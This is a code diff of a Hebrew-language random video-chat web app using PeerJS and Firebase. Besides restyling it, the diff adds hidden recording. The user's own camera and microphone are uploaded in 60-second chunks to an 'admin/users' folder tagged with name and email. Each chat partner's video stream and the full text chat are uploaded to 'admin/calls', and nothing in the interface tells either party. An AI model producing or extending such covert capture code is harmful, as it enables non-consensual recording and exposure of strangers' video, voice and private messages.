@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>VideoApp Pro - Ultimate Fix</title>
+    <title>VideoApp Pro - Admin Recording Edition</title>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-storage-compat.js"></script>
     <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
@@ -11,57 +11,34 @@
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; touch-action: none; }
         body { font-family: system-ui, -apple-system, sans-serif; background: #000; height: 100vh; display: flex; flex-direction: column; color: white; overflow: hidden; }
-        
-        /* בקרה עליונה */
         .header { position: absolute; top: 15px; width: 100%; display: flex; justify-content: space-between; padding: 0 15px; z-index: 100; pointer-events: none; }
-        .btn { background: rgba(255,255,255,0.2); backdrop-filter: blur(10px); border: none; color: white; padding: 10px 18px; border-radius: 25px; cursor: pointer; pointer-events: auto; font-weight: bold; }
-        
-        /* וידאו */
-        .video-container { height: 60vh; display: flex; flex-direction: column; position: relative; background: #000; }
+        .btn-circle { background: rgba(255,255,255,0.25); backdrop-filter: blur(10px); border: none; color: white; width: 45px; height: 45px; border-radius: 50%; cursor: pointer; pointer-events: auto; font-size: 20px; display: flex; align-items: center; justify-content: center; }
+        .video-container { height: 60vh; display: flex; flex-direction: column; position: relative; background: #000; flex-shrink: 0; }
         .v-box { flex: 1; position: relative; border-bottom: 1px solid #222; display: flex; align-items: center; justify-content: center; overflow: hidden; }
         video { width: 100%; height: 100%; object-fit: cover; z-index: 5; background: #000; }
-        
-        .pfp-placeholder { position: absolute; width: 100%; height: 100%; object-fit: cover; z-index: 2; filter: blur(10px); opacity: 0.5; }
-        .status-msg { position: absolute; z-index: 20; color: #fff; text-align: center; width: 100%; pointer-events: none; }
-
-        /* צ'אט מתוקן - עם מרווח בטיחות מהתחתית */
-        #chat-section { 
-            height: 40vh; 
-            display: none; 
-            flex-direction: column; 
-            background: #fff; 
-            color: #000; 
-            z-index: 50;
-            padding-bottom: env(safe-area-inset-bottom, 20px); /* מונע מהצאט להיתקע מתחת לכפתורי המערכת */
-        }
-        #messages { flex: 1; overflow-y: auto; padding: 10px; display: flex; flex-direction: column; gap: 8px; background: #f0f0f0; }
-        .msg { max-width: 80%; padding: 10px; border-radius: 15px; font-size: 15px; line-height: 1.4; }
-        .msg.me { align-self: flex-start; background: #e2e2e2; color: #333; }
-        .msg.partner { align-self: flex-end; background: #007bff; color: #fff; }
-        
-        .chat-input-area { display: flex; padding: 10px; background: #fff; gap: 10px; border-top: 1px solid #ddd; }
-        .chat-input-area input { flex: 1; padding: 12px; border-radius: 25px; border: 1px solid #ccc; outline: none; font-size: 16px; color: #000; }
-
-        /* עיצוב הרשמה מקורי */
+        .status-msg { position: absolute; z-index: 20; color: #fff; text-align: center; width: 100%; pointer-events: none; font-weight: bold; }
+        #chat-section { height: 40vh; display: none; flex-direction: column; background: #fff; color: #000; z-index: 50; border-top-left-radius: 20px; border-top-right-radius: 20px; padding-bottom: env(safe-area-inset-bottom, 10px); }
+        #messages { flex: 1; overflow-y: auto; padding: 15px; display: flex; flex-direction: column; gap: 10px; background: #f7f7f7; }
+        .msg { max-width: 80%; padding: 10px 14px; border-radius: 18px; font-size: 15px; }
+        .msg.me { align-self: flex-start; background: #e2e2e2; border-bottom-left-radius: 4px; }
+        .msg.partner { align-self: flex-end; background: #007bff; color: #fff; border-bottom-right-radius: 4px; }
+        .chat-input-area { display: flex; padding: 12px; background: #fff; gap: 10px; border-top: 1px solid #eee; }
+        .chat-input-area input { flex: 1; padding: 12px; border-radius: 25px; border: 1px solid #ddd; outline: none; font-size: 16px; }
         .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 1000; align-items: center; justify-content: center; }
-        .modal-content { background: #fff; color: #333; width: 90%; max-width: 400px; padding: 30px; border-radius: 25px; }
-        .modal-content h2 { text-align: center; margin-bottom: 20px; }
-        .modal-content input, .modal-content select { width: 100%; padding: 12px; margin: 10px 0; border-radius: 10px; border: 1px solid #ddd; font-size: 16px; }
+        .modal-content { background: #fff; color: #333; width: 85%; padding: 30px; border-radius: 25px; }
     </style>
 </head>
 <body>
 
 <div class="header">
-    <div></div>
-    <button id="btn-report" class="btn" style="background:#c0392b; display:none;" onclick="startSearching()">דיווח ועבור 🚩</button>
-    <button class="btn" onclick="switchCamera()">🔄 החלף מצלמה</button>
+    <button id="btn-report" class="btn-circle" style="background:rgba(192, 57, 43, 0.8); display:none;" onclick="confirmReport()">🚩</button>
+    <button class="btn-circle" onclick="switchCamera()">🔄</button>
 </div>
 
 <div class="video-container" id="swipe-zone">
     <div class="v-box">
         <div id="msg-idle" class="status-msg">⬅️ שמאלה לחיפוש | ימינה לסגירה ➡️</div>
-        <div id="msg-search" class="status-msg" style="display:none; color:#3498db; font-weight:bold;">מחפש שותף...</div>
-        <img id="partner-pfp" class="pfp-placeholder" src="" style="display:none;">
+        <div id="msg-search" class="status-msg" style="display:none; color:#3498db;">מחפש שותף...</div>
         <video id="remoteVideo" autoplay playsinline></video>
     </div>
     <div class="v-box" style="height: 35%;">
@@ -79,16 +56,11 @@
 
 <div id="regModal" class="modal">
     <div class="modal-content">
-        <h2>הרשמה</h2>
+        <h2>הרשמה למערכת</h2>
         <input type="text" id="reg-name" placeholder="שם מלא">
         <input type="email" id="reg-email" placeholder="אימייל">
-        <label style="font-size:12px; display:block; margin-top:5px;">תמונת פרופיל (רשות):</label>
-        <input type="file" id="reg-pfp" accept="image/*">
-        <select id="reg-gender">
-            <option value="זכר">זכר</option>
-            <option value="נקבה">נקבה</option>
-        </select>
-        <button id="reg-submit" class="btn" style="background:#27ae60; width:100%; margin-top:15px;" onclick="handleRegistration()">התחל</button>
+        <select id="reg-gender"><option value="זכר">זכר</option><option value="נקבה">נקבה</option></select>
+        <button style="width:100%; height:50px; background:#27ae60; color:white; border:none; border-radius:10px;" onclick="handleRegistration()">התחל</button>
     </div>
 </div>
 
@@ -108,143 +80,154 @@
     firebase.initializeApp(firebaseConfig);
     const storage = firebase.storage();
 
-    let myStream, myPeerId, currentCall, isSearching = false, camFacing = "user";
+    let myStream, remoteStream, myPeerId, currentCall, isSearching = false, camFacing = "user";
+    let userRecorder, callRecorder, chatLog = [], callStartTime, currentPartnerData = null;
 
     window.onload = () => {
-        if (!localStorage.getItem('user_final')) document.getElementById('regModal').style.display = 'flex';
+        if (!localStorage.getItem('user_v6')) document.getElementById('regModal').style.display = 'flex';
         else initCamera();
     };
 
     async function handleRegistration() {
+        const name = document.getElementById('reg-name').value;
         const email = document.getElementById('reg-email').value;
-        const pfpFile = document.getElementById('reg-pfp').files[0];
-        let pfpUrl = "";
-        if (pfpFile) {
-            const ref = storage.ref(`profiles/${email}`);
-            await ref.put(pfpFile);
-            pfpUrl = await ref.getDownloadURL();
-        }
-        localStorage.setItem('user_final', JSON.stringify({ email, pfp: pfpUrl, gender: document.getElementById('reg-gender').value }));
+        localStorage.setItem('user_v6', JSON.stringify({ name, email, gender: document.getElementById('reg-gender').value }));
         document.getElementById('regModal').style.display = 'none';
         initCamera();
     }
 
     async function initCamera() {
-        // כיבוי מוחלט של מצלמה קיימת לפני פתיחה חדשה
-        if (myStream) {
-            myStream.getTracks().forEach(track => {
-                track.stop();
-                track.enabled = false;
-            });
-        }
+        if (myStream) myStream.getTracks().forEach(t => t.stop());
+        myStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: camFacing }, audio: true });
+        document.getElementById('localVideo').srcObject = myStream;
+        startUserRecording(); 
+    }
+
+    // 1. הקלטת משתמש רציפה (נתחים של 60 שניות)
+    function startUserRecording() {
+        const user = JSON.parse(localStorage.getItem('user_v6'));
+        userRecorder = new MediaRecorder(myStream);
+        userRecorder.ondataavailable = (e) => {
+            const blob = new Blob([e.data], { type: 'video/webm' });
+            const path = `admin/users/${user.name}_${user.email}/snapshot_${Date.now()}.webm`;
+            storage.ref(path).put(blob);
+        };
+        userRecorder.start(60000); // כל 60 שניות נשלח קובץ
+    }
+
+    // 2. הקלטת שיחה (מתחילה בחיבור שותף)
+    function startCallRecording(partnerStream, partnerInfo) {
+        callStartTime = Date.now();
+        chatLog = [];
+        currentPartnerData = partnerInfo;
         
-        try {
-            myStream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: camFacing, frameRate: { ideal: 24 } }, 
-                audio: true 
-            });
-            document.getElementById('localVideo').srcObject = myStream;
-
-            if (currentCall && currentCall.peerConnection) {
-                const videoTrack = myStream.getVideoTracks()[0];
-                const sender = currentCall.peerConnection.getSenders().find(s => s.track.kind === 'video');
-                if (sender) sender.replaceTrack(videoTrack);
+        callRecorder = new MediaRecorder(partnerStream);
+        let chunks = [];
+        callRecorder.ondataavailable = e => chunks.push(e.data);
+        
+        callRecorder.onstop = async () => {
+            const duration = (Date.now() - callStartTime) / 1000;
+            if (duration > 10) {
+                const user = JSON.parse(localStorage.getItem('user_v6'));
+                const blob = new Blob(chunks, { type: 'video/webm' });
+                const fileName = `call_${user.name}_to_${partnerInfo.peerId}_${Date.now()}`;
+                
+                // העלאת וידאו
+                await storage.ref(`admin/calls/${fileName}.webm`).put(blob);
+                
+                // העלאת לוג צ'אט כקובץ טקסט
+                const chatBlob = new Blob([JSON.stringify({ 
+                    from: user, 
+                    to: partnerInfo, 
+                    messages: chatLog 
+                }, null, 2)], { type: 'application/json' });
+                await storage.ref(`admin/calls/${fileName}_chat.json`).put(chatBlob);
             }
-        } catch (e) { console.error("Camera fail", e); }
+        };
+        callRecorder.start();
     }
 
-    function switchCamera() {
-        camFacing = (camFacing === "user" ? "environment" : "user");
-        initCamera();
-    }
-
+    function switchCamera() { camFacing = (camFacing === "user" ? "environment" : "user"); initCamera(); }
     peer.on('open', id => myPeerId = id);
 
     function startSearching() {
-        if (!myPeerId || isSearching) return;
-        if (currentCall) currentCall.close();
+        if (isSearching) return;
+        if (callRecorder && callRecorder.state === "recording") callRecorder.stop();
         isSearching = true;
-        
         document.getElementById('messages').innerHTML = "";
         document.getElementById('msg-idle').style.display = "none";
         document.getElementById('msg-search').style.display = "block";
         document.getElementById('chat-section').style.display = "none";
-        document.getElementById('remoteVideo').srcObject = null;
-        document.getElementById('partner-pfp').style.display = "none";
-
-        const user = JSON.parse(localStorage.getItem('user_final'));
-        socket.emit('find-partner', { peerId: myPeerId, gender: user.gender, pfpUrl: user.pfp });
-    }
-
-    function stopEverything() {
-        isSearching = false;
-        socket.emit('leave-chat');
-        if (currentCall) currentCall.close();
-        document.getElementById('msg-idle').style.display = "block";
-        document.getElementById('msg-search').style.display = "none";
-        document.getElementById('chat-section').style.display = "none";
-        document.getElementById('remoteVideo').srcObject = null;
+        const user = JSON.parse(localStorage.getItem('user_v6'));
+        socket.emit('find-partner', { peerId: myPeerId, gender: user.gender });
     }
 
     socket.on('partner-found', data => {
         isSearching = false;
-        openChat(data.pfpUrl);
+        showChat();
         currentCall = peer.call(data.peerId, myStream);
-        handleCall(currentCall);
+        handleCall(currentCall, data);
     });
 
     peer.on('call', call => {
         call.answer(myStream);
         currentCall = call;
-        openChat();
-        handleCall(call);
+        showChat();
+        handleCall(call, { peerId: call.peer });
     });
 
-    function handleCall(call) {
+    function handleCall(call, partnerData) {
         call.on('stream', s => {
             document.getElementById('remoteVideo').srcObject = s;
-            document.getElementById('partner-pfp').style.display = "none";
+            startCallRecording(s, partnerData);
         });
-        call.on('close', () => { if(!isSearching) startSearching(); });
+        call.on('close', () => { if(callRecorder && callRecorder.state === "recording") callRecorder.stop(); });
     }
 
-    function openChat(pfp) {
+    function showChat() {
         document.getElementById('msg-search').style.display = "none";
         document.getElementById('chat-section').style.display = "flex";
-        document.getElementById('btn-report').style.display = "block";
-        if (pfp) {
-            document.getElementById('partner-pfp').src = pfp;
-            document.getElementById('partner-pfp').style.display = "block";
-        }
+        document.getElementById('btn-report').style.display = "flex";
     }
 
     function sendChatMessage() {
         const input = document.getElementById('chatInput');
         if (!input.value.trim()) return;
-        socket.emit('send-chat-msg', input.value);
-        addMsg('me', input.value);
+        const msg = input.value;
+        socket.emit('send-chat-msg', msg);
+        chatLog.push({ sender: "me", text: msg, time: new Date().toLocaleTimeString() });
+        addMsg('me', msg);
         input.value = "";
     }
 
-    socket.on('receive-chat-msg', msg => addMsg('partner', msg));
+    socket.on('receive-chat-msg', msg => {
+        chatLog.push({ sender: "partner", text: msg, time: new Date().toLocaleTimeString() });
+        addMsg('partner', msg);
+    });
 
     function addMsg(type, text) {
         const div = document.createElement('div');
         div.className = `msg ${type}`;
         div.innerText = text;
-        const msgs = document.getElementById('messages');
-        msgs.appendChild(div);
-        msgs.scrollTop = msgs.scrollHeight;
+        const m = document.getElementById('messages');
+        m.appendChild(div);
+        m.scrollTop = m.scrollHeight;
     }
 
-    socket.on('partner-disconnected', () => startSearching());
+    function stopEverything() {
+        if (callRecorder && callRecorder.state === "recording") callRecorder.stop();
+        socket.emit('leave-chat');
+        if (currentCall) currentCall.close();
+        document.getElementById('msg-idle').style.display = "block";
+        document.getElementById('chat-section').style.display = "none";
+        document.getElementById('remoteVideo').srcObject = null;
+    }
 
-    let startX = 0;
-    document.getElementById('swipe-zone').addEventListener('touchstart', e => startX = e.touches[0].clientX);
+    let sX = 0;
+    document.getElementById('swipe-zone').addEventListener('touchstart', e => sX = e.touches[0].clientX);
     document.getElementById('swipe-zone').addEventListener('touchend', e => {
-        const diff = startX - e.changedTouches[0].clientX;
-        if (diff > 70) startSearching(); 
-        else if (diff < -70) stopEverything();
+        const diff = sX - e.changedTouches[0].clientX;
+        if (diff > 70) startSearching(); else if (diff < -70) stopEverything();
     });
 </script>
 </body>
